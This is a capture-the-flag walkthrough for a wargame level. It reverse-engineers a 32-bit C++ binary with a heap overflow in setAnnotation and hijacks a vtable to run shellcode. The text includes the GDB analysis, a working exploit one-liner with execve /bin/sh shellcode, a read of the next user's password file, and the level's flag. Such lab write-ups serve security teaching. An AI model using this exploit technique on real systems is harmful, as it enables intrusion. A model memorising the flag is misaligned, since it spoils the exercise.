# Level 9

## Connect to the virtual machine with SSH

Use the flag from `level8` as the `level9` password:

```bash
ssh level9@127.0.0.1 -p 2223
```

## Copy the binary to the host machine

From the root of this repository on the host:

```bash
scp -P 2223 level9@127.0.0.1:/home/user/level9/level9 ./level9/
```

The extracted binary is saved as `level9/level9`.

## Copy the GDB dump to the host

Inside the VM, connected as `level9`, open the binary with GDB:

```bash
gdb ./level9
```

Then enter:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/level9_main_dump_gdb
set logging overwrite on
set logging on
disas main
disas _ZN1NC1Ei
disas _ZN1N13setAnnotationEPc
disas _ZN1NplERS_
disas _ZN1NmiERS_
set logging off
quit
```

Then copy the dump back from the host:

```bash
scp -P 2223 level9@127.0.0.1:/tmp/level9_main_dump_gdb ./level9/
```

Since the binary is already on the host, the same dump can also be generated
locally:

```bash
gdb -q -batch \
  -ex "set disassembly-flavor intel" \
  -ex "disassemble main" \
  -ex "disassemble _ZN1NC1Ei" \
  -ex "disassemble _ZN1N13setAnnotationEPc" \
  -ex "disassemble _ZN1NplERS_" \
  -ex "disassemble _ZN1NmiERS_" \
  ./level9/level9 > ./level9/level9_main_dump_gdb
```

## Analyze the GDB dump

This binary is C++. `main` creates two `N` objects with `new`:

```asm
0x08048610 <+28>: mov    DWORD PTR [esp],0x6c
0x08048617 <+35>: call   0x8048530 <_Znwj@plt>
...
0x08048629 <+53>: call   0x80486f6 <_ZN1NC2Ei>
...
0x08048632 <+62>: mov    DWORD PTR [esp],0x6c
0x08048639 <+69>: call   0x8048530 <_Znwj@plt>
...
0x0804864b <+87>: call   0x80486f6 <_ZN1NC2Ei>
```

Each object is `0x6c` bytes. The constructor writes a vtable pointer at the
start of the object and an integer at offset `0x68`:

```asm
0x080486f9 <+3>:  mov    eax,DWORD PTR [ebp+0x8]
0x080486fc <+6>:  mov    DWORD PTR [eax],0x8048848
0x08048702 <+12>: mov    eax,DWORD PTR [ebp+0x8]
0x08048708 <+18>: mov    DWORD PTR [eax+0x68],edx
```

So the object layout is:

```text
object + 0x00: vtable pointer
object + 0x04: annotation buffer starts here
object + 0x68: integer value
```

Then `main` copies `argv[1]` into the first object with `setAnnotation`:

```asm
0x08048670 <+124>: mov    eax,DWORD PTR [esp+0x14]
0x08048677 <+131>: call   0x804870e <_ZN1N13setAnnotationEPc>
```

`setAnnotation` uses `strlen(argv[1])` as the copy size and copies into
`this + 4`:

```asm
0x08048714 <+6>:  mov    eax,DWORD PTR [ebp+0xc]
0x0804871a <+12>: call   0x8048520 <strlen@plt>
0x0804871f <+17>: mov    edx,DWORD PTR [ebp+0x8]
0x08048722 <+20>: add    edx,0x4
0x08048733 <+37>: call   0x8048510 <memcpy@plt>
```

There is no length check. A long annotation overflows out of the first object
and into the second object.

After the copy, `main` performs a virtual method call on the second object:

```asm
0x0804867c <+136>: mov    eax,DWORD PTR [esp+0x10]
0x08048680 <+140>: mov    eax,DWORD PTR [eax]
0x08048682 <+142>: mov    edx,DWORD PTR [eax]
0x0804868c <+152>: mov    eax,DWORD PTR [esp+0x10]
0x08048690 <+156>: mov    DWORD PTR [esp],eax
0x08048693 <+159>: call   edx
```

This means:

```text
eax = second_object
eax = second_object->vtable
edx = second_object->vtable[0]
call edx
```

If we overwrite the second object's vtable pointer, we control where the
virtual call goes.

## Find the exact offset

Do not guess the object distance. Break after both objects have been allocated:

```gdb
break *main+96
run AAAA
p/x *(void **)($esp+0x1c)
p/x *(void **)($esp+0x18)
p/d *(void **)($esp+0x18)-(*(void **)($esp+0x1c)+4)
```

Result:

```text
Breakpoint 1, 0x08048654 in main ()
$1 = 0x804a008
$2 = 0x804a078
$3 = 108
```

So:

```text
first object           = 0x0804a008
first annotation start = 0x0804a00c
second object          = 0x0804a078
```

The second object's vtable pointer is at the start of the second object:

```text
0x0804a078 - 0x0804a00c = 108
```

After 108 bytes from the start of the annotation buffer, we overwrite the
second object's vtable pointer.

## Build the fake vtable

The virtual call reads a function pointer from the address stored in the vtable
pointer. So we need:

```text
second_object->vtable = address of fake vtable
fake_vtable[0]        = address of shellcode
```

Put the fake vtable at the beginning of the annotation buffer:

```text
fake vtable address = 0x0804a00c
```

Put shellcode immediately after that fake vtable pointer:

```text
shellcode address = 0x0804a010
```

The payload layout is:

```text
[0x0804a010][shellcode][padding until 108 bytes][0x0804a00c]
```

The first 4 bytes are the fake vtable entry. They point to the shellcode.

The shellcode is 21 bytes, so the padding is:

```text
108 - 4 - 21 = 83
```

## Exploitation

Addresses in little endian:

```text
0x0804a010 -> \x10\xa0\x04\x08
0x0804a00c -> \x0c\xa0\x04\x08
```

Run this in the VM:

```bash
(/home/user/level9/level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x0c\xa0\x04\x08"'); cat)
```

The `cat` keeps stdin open for the shell after the virtual call jumps to the
shellcode.

Check the effective identity:

```bash
whoami
```

Result:

```text
bonus0
```

Read the next password:

```bash
cat /home/user/bonus0/.pass
```

## Flag

```text
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
